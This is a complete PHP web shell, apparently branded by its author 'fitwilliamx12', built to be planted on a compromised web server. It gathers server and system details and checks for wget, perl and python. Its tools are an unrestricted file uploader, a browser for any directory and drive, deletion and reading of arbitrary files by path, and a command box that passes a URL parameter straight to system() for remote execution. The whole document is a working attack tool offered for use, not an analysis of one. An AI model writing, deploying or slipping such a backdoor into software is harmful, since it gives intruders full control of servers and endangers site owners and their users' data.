<html>
<head>
<title>fitwilliamx12 cmd and uploader</title>
    <style>
        body {
            font-family: Consolas, monospace;
            background-color: black;
            color: white;
            padding: 20px;
        }
        a {
            color: lightblue;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        h1, h2 {
            font-size: 20px;
        }
        p {
            font-size: 12px;
        }
        input[type="text"], input[type="submit"], input[type="file"] {
            font-size: 12px;
        }
        .directory-path {
            margin-bottom: 10px;
            padding: 10px;
            background-color: transparent;
            border: 1px solid white;
            border-radius: 5px;
            display: inline-block;
            color: white;
        }
        .directory-contents {
            padding: 10px;
            background-color: transparent;
            border: 1px solid white;
            border-radius: 5px;
            font-size: 12px;
            max-height: 200px;
            overflow-y: auto;
            width: 90%;
            margin-top: 10px;
            color: white;
        }
        .file-item {
            margin: 5px 0;
        }
        .file-item a {
            color: lightblue;
        }
        h2 {
            font-size: 13px;
        }
        .file-actions {
            font-size: 12px;
            color: yellow;
        }
        .system-info {
            background-color: #333;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            color: white;
            font-size: 12px;
        }
        .status-on {
            color: lime;
        }
        .status-off {
            color: red;
        }
        .file-list {
            padding: 10px;
            background-color: #222;
            border: 1px solid white;
            border-radius: 5px;
            max-height: 200px;
            overflow-y: auto;
            font-size: 12px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h1>fitwilliamx12 cmd and uploader  |   <a href="https://instagram.com/fitwilliamx12">> Contact me < </a><br>
    <!-- System Information Section -->
    <div class="system-info">
        <p><strong>SERVER IP:</strong> <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unavailable'; ?></p>
        <p><strong>YOUR IP:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
        <p><strong>WEB SERVER:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
        <p><strong>SYSTEM:</strong> <?php echo php_uname(); ?></p>
        <?php
        $totalSpace = disk_total_space("/");
        $freeSpace = disk_free_space("/");
        $usedSpace = $totalSpace - $freeSpace;
        $totalSpaceGB = number_format($totalSpace / 1073741824, 2); // Convert to GB
        $freeSpaceGB = number_format($freeSpace / 1073741824, 2); // Convert to GB
        $usedSpaceGB = number_format($usedSpace / 1073741824, 2); // Convert to GB

        echo "<p><strong>HDD:</strong> $freeSpaceGB GB / $totalSpaceGB GB (Free: $freeSpaceGB GB)</p>";
        ?>
        <p><strong>PHP VERSION:</strong> <?php echo phpversion(); ?></p>
        <p><strong>DISABLE FUNC:</strong> <?php echo ini_get('disable_functions') ? ini_get('disable_functions') : 'None'; ?></p>
        <p>
           <strong>MySQL:</strong> <span class="<?php echo extension_loaded('mysqli') ? 'status-on' : 'status-off'; ?>"> <?php echo extension_loaded('mysqli') ? 'ON' : 'OFF'; ?></span> | 
           <strong>cURL:</strong> <span class="<?php echo extension_loaded('curl') ? 'status-on' : 'status-off'; ?>"> <?php echo extension_loaded('curl') ? 'ON' : 'OFF'; ?></span> | 
           <strong>WGET:</strong> <span class="<?php echo (function_exists('shell_exec') && shell_exec('wget --version')) ? 'status-on' : 'status-off'; ?>"> <?php echo (function_exists('shell_exec') && shell_exec('wget --version')) ? 'ON' : 'OFF'; ?></span> | 
           <strong>Perl:</strong> <span class="<?php echo (function_exists('shell_exec') && shell_exec('perl -v')) ? 'status-on' : 'status-off'; ?>"> <?php echo (function_exists('shell_exec') && shell_exec('perl -v')) ? 'ON' : 'OFF'; ?></span> | 
           <strong>Python:</strong> <span class="<?php echo (function_exists('shell_exec') && shell_exec('python --version')) ? 'status-on' : 'status-off'; ?>"> <?php echo (function_exists('shell_exec') && shell_exec('python --version')) ? 'ON' : 'OFF'; ?></span>
        </p>
    </div>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="__">
        <input name="_" type="submit" value="Upload">
    </form>
    <?php
    if ($_POST) {
        if (@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])) {
            echo '<p style="color: lime;">File uploaded successfully: ' . htmlspecialchars($_FILES['__']['name']) . '</p>';
        } else {
            echo '<p style="color: red;">Failed to upload file.</p>';
        }
    }
    ?>
    <h2>Detected Drives</h2>
    <p>
        <?php
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $drives = array();
            foreach (range('A', 'Z') as $letter) {
                if (is_dir($letter . ':/')) {
                    $drives[] = '<a href="?dir=' . urlencode($letter . ':\\') . '">' . $letter . ':</a>';
                }
            }
            echo implode(' | ', $drives);
        } else {
            echo 'Detected Drives feature is available only on Windows.';
        }
        ?>
    </p>
    <?php
    $requestedDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    if (!is_dir($requestedDir)) {
        $requestedDir = getcwd();
    }
    $currentDir = realpath($requestedDir);
    ?>
    <h2>Lokasi Directory</h2>
    <div class="directory-path">
        <?php
        $parts = explode(DIRECTORY_SEPARATOR, $currentDir);
        $path = '';
        foreach ($parts as $key => $part) {
            if ($key == 0 && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                $path = $part . DIRECTORY_SEPARATOR;
                echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>';
            } else {
                $path .= $part . DIRECTORY_SEPARATOR;
                echo ' / <a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>';
            }
        }
        ?>
    </div>
    <h2>Buat Directory</h2>
    <form method="POST">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($currentDir, ENT_QUOTES, 'UTF-8'); ?>">
        <input type="text" name="new_dir" placeholder="Enter new directory name" required>
        <input type="submit" name="create_dir" value="Create">
    </form>
    <?php
    if (isset($_POST['create_dir']) && !empty($_POST['new_dir'])) {
        $newDirPath = rtrim($_POST['current_dir'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $_POST['new_dir'];
        if (mkdir($newDirPath)) {
            echo '<p style="color: lime;">Directory created successfully: ' . htmlspecialchars($_POST['new_dir']) . '</p>';
        } else {
            echo '<p style="color: red;">Failed to create directory: ' . htmlspecialchars($_POST['new_dir']) . '</p>';
        }
    }
    ?>
    <div class="file-list">
        <h2>File List</h2>
        <?php
        $files = scandir($currentDir);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
            $fileSize = is_file($filePath) ? filesize($filePath) : '-';
            $fileModified = date("Y-m-d H:i:s", filemtime($filePath));
            
            echo '<div class="file-item">';
            if (is_dir($filePath)) {
                echo '[DIR] <a href="?dir=' . urlencode($filePath) . '">' . htmlspecialchars($file) . '</a>';
            } else {
                echo '[FILE] ' . htmlspecialchars($file) . ' | Size: ' . $fileSize . ' bytes | Modified: ' . $fileModified .
                '  | <a href="?delete=' . urlencode($filePath) . '" style="color: red;">Delete</a>';
            }
            echo '</div>';
        }
        // File Deletion
        if (isset($_GET['delete'])) {
            $deletePath = $_GET['delete'];
            if (is_file($deletePath) && unlink($deletePath)) {
                echo '<p style="color: lime;">File deleted successfully: ' . htmlspecialchars(basename($deletePath)) . '</p>';
            } else {
                echo '<p style="color: red;">Failed to delete file: ' . htmlspecialchars(basename($deletePath)) . '</p>';
            }
        }
        // File Viewing
        if (isset($_GET['view'])) {
            $viewPath = $_GET['view'];
            if (is_file($viewPath)) {
                echo '<h2>View File</h2>';
                echo '<pre>' . htmlspecialchars(file_get_contents($viewPath)) . '</pre>';
            }
        }
        ?>
    </div>
    <h2>CMD [ Windows ]</h2>
    <form method="GET">
        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir, ENT_QUOTES, 'UTF-8'); ?>">
        <input type="text" name="cmd" autofocus size="80" placeholder="Enter command (e.g., dir)">
        <input type="submit" value=">>>">
    </form>
    <pre>
    <?php
    if (!empty($_GET['cmd'])) {
        $command = $_GET['cmd'];
        echo "Command: " . htmlspecialchars($command, ENT_QUOTES, 'UTF-8') . "\n\n";
        system($command . ' 2>&1');
    }
    ?>
    </pre>
</body>
</html>
